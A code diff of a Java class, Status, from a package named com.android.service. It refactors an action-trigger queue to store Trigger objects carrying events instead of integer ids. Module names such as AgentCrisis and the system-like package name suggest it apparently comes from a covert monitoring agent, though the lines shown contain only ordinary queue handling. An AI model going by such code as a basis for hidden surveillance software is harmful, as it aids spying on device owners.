@@ -17,6 +17,7 @@ import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfModule;
 import com.android.service.conf.ConfEvent;
 import com.android.service.conf.Globals;
+import com.android.service.event.BaseEvent;
 import com.android.service.module.AgentCrisis;
 import com.android.service.util.Check;
 
@@ -344,11 +345,12 @@ public class Status {
 	 * 
 	 * @param i
 	 *            the i
+	 * @param baseEvent 
 	 */
-	public void triggerAction(final int i) {
+	public void triggerAction(final int i, BaseEvent baseEvent) {
 		Action action = actionsMap.get(new Integer(i));
 		int qq = action.getQueue();
-		ArrayList<Integer> act = (ArrayList<Integer>) triggeredActions[qq];
+		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
 		Object tsem = triggeredSemaphore[qq];
 
 		if (Cfg.DEBUG)
@@ -356,9 +358,10 @@ public class Status {
 		if (Cfg.DEBUG)
 			Check.asserts(tsem != null, "triggerAction, null tsem");
 
+		Trigger trigger = new Trigger(i,baseEvent);
 		synchronized (act) {
-			if (!act.contains(i)) {
-				act.add(new Integer(i));
+			if (!act.contains(trigger)) {
+				act.add(new Trigger(i,baseEvent));
 			}
 		}
 		synchronized (tsem) {
@@ -377,11 +380,11 @@ public class Status {
 	 * 
 	 * @return the triggered actions
 	 */
-	public int[] getTriggeredActions(int qq) {
+	public Trigger[] getTriggeredActions(int qq) {
 		if (Cfg.DEBUG)
 			Check.asserts(qq >= 0 && qq < Action.NUM_QUEUE, "getTriggeredActions qq: " + qq);
 
-		ArrayList<Integer> act = (ArrayList<Integer>) triggeredActions[qq];
+		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
 		Object tsem = triggeredSemaphore[qq];
 
 		if (Cfg.DEBUG)
@@ -399,7 +402,7 @@ public class Status {
 
 		synchronized (tsem) {
 			final int size = act.size();
-			final int[] triggered = new int[size];
+			final Trigger[] triggered = new Trigger[size];
 
 			for (int i = 0; i < size; i++) {
 				triggered[i] = act.get(i);
@@ -415,11 +418,11 @@ public class Status {
 	 * @return
 	 */
 	@Deprecated
-	public int[] getNonBlockingTriggeredActions(int qq) {
+	public Trigger[] getNonBlockingTriggeredActions(int qq) {
 		
-		ArrayList<Integer> act = (ArrayList<Integer>) triggeredActions[qq];
+		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
 		final int size = act.size();
-		final int[] triggered = new int[size];
+		final Trigger[] triggered = new Trigger[size];
 
 		for (int i = 0; i < size; i++) {
 			triggered[i] = act.get(i);
@@ -436,12 +439,13 @@ public class Status {
 	 */
 	public void unTriggerAction(final Action action) {
 		int qq = action.getQueue();
-		ArrayList<Integer> act = (ArrayList<Integer>) triggeredActions[qq];
+		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
 		Object sem = triggeredSemaphore[qq];
 
+		Trigger trigger=new Trigger(action.getId(), null);
 		synchronized (act) {
-			if (act.contains(action.getId())) {
-				act.remove(new Integer(action.getId()));
+			if (act.contains(trigger)) {
+				act.remove(trigger);
 			}
 		}
 		synchronized (sem) {
@@ -464,7 +468,7 @@ public class Status {
 		}
 
 		for (int qq = 0; qq < Action.NUM_QUEUE; qq++) {
-			ArrayList<Integer> act = (ArrayList<Integer>) triggeredActions[qq];
+			ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
 			Object sem = triggeredSemaphore[qq];
 
 			synchronized (act) {
